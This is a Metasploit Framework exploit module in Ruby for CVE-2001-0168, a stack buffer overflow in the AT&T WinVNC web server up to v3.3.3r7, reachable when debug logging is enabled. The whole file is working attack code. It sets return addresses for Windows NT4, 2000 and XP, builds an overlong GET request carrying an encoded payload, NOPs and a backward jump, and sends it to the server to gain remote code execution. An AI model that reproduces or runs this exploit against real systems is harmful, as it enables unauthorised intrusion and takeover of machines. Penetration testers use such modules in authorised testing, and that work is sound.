##
# $Id: winvnc_http_get.rb 7724 2009-12-06 05:50:37Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'


	class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'WinVNC Web Server <= v3.3.3r7 GET Overflow',
			'Description'	=> %q{
				This module exploits a buffer overflow in the AT&T WinVNC version
				<= v3.3.3r7 web server. When debugging mode with logging is
				enabled (non-default), an overly long GET request can overwrite
				the stack. This exploit does not work well with VNC payloads!
			},
			'Author' 	=> 'patrick',
			'License'       => MSF_LICENSE,
			'Version'       => '$Revision: 7724 $',
			'References'    =>
			[
				[ 'BID', '2306' ],
				[ 'OSVDB', '6280' ],
				[ 'CVE', '2001-0168' ],
			],
			'Privileged'		=> true,
			'DefaultOptions'	=>
			{
				'EXITFUNC'	=> 'thread',
			},
			'Payload'		=>
				{
					'Space'			=> 979,
					'BadChars' 		=> "\x00\x09\x0a\x0b\x0c\x0d\x20\x0b",
					'StackAdjustment' 	=> -3500,
				},
			'Platform' => ['win'],
			'Targets'  =>
			[
				[ 'Windows NT4 SP3-6', 	{ 'Ret' => 0x779f4e39 } ], # push esp, ret msvcrt.dll
				[ 'Windows 2000 SP1-4', { 'Ret' => 0x77bba3af } ], # jmp esp comctl32.dll
				[ 'Windows XP SP0-1', 	{ 'Ret' => 0x71ab7bfb } ], # jmp esp ws2_32.dll
			],
			'DisclosureDate' => 'Jan 29 2001',
			'DefaultTarget' => 1))

			register_options(
			[
				Opt::RPORT(5800),
			],self.class)
	end

	def exploit

		sploit = '/' + payload.encoded + [target['Ret']].pack('V')
		sploit << make_nops(8) + Rex::Arch::X86.jmp(0xfffffc1c)

		res = send_request_raw({
			'uri'          => sploit,
			'method'       => 'GET',
		}, 5)

		handler

	end

end